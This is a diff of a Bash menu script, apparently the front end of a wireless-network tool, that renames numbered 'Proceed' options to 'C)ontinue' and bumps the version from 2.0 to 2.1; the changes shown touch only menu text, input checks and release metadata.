-5) Proceed
+C)ontinue
 
 P)revious Menu
 
@@ -2680,7 +2858,7 @@ M)ain Menu\033[1;34m
 			read e
 			rtech_II--;;
 
-			5) if [[ -z $tc || -z $sm || -z $b ]];then
+			c|C) if [[ -z $tc || -z $sm || -z $b ]];then
 				echo -e "\033[31m\nAll Fields Must be Filled Before Proceeding"
 				sleep 1
 				rtech_II--
@@ -2707,7 +2885,7 @@ M)ain Menu\033[1;34m
 
 5) ESSID {Optional}                                [\033[1;33m$e\033[36m]
 
-6) Proceed
+C)ontinue
 
 P)revious Menu
 
@@ -2740,7 +2918,7 @@ M)ain Menu\033[1;34m
 			read e
 			rtech_II--;;
 
-			6) if [[ -z $rppb || -z $tc || -z $sm || -z $b ]];then
+			c|C) if [[ -z $rppb || -z $tc || -z $sm || -z $b ]];then
 				echo -e "\033[31m\nAll Fields Must be Filled Before Proceeding"
 				sleep 1
 				rtech_II--
@@ -2823,7 +3001,7 @@ M)ain Menu\033[1;34m
 
 3) Tgt ESSID    [\033[1;33m$e\033[36m]
 
-4) Proceed
+C)ontinue
 
 P)revious Menu
 
@@ -2843,7 +3021,7 @@ M)ain Menu\033[1;34m
 		read e
 		ctech_II--;;
 
-		4) if [[ -z $tc || -z $b || -z $e ]];then
+		c|C) if [[ -z $tc || -z $b || -z $e ]];then
 			echo -e "\033[31mAll Fields Must be Filled Before Proceeding"
 			sleep 1
 			ctech_II--
@@ -2919,8 +3097,8 @@ if [ -z $1  ]; then
 	pii= ## Dual mode variable, can be monitormode variable, or device to be assigned to monitor mode
 	kill_mon= ## Variable to determine if the "killing a monitor mode option" has been selected
 	dev_check= ## Nulled
-	current_ver=2.0
-	rel_date="17 December 2011"
+	current_ver=2.1
+	rel_date="03 January 2012"
 	trap_check= ## Variable for exiting out of the Parent script if the update feature is launched
 	greet--
 else
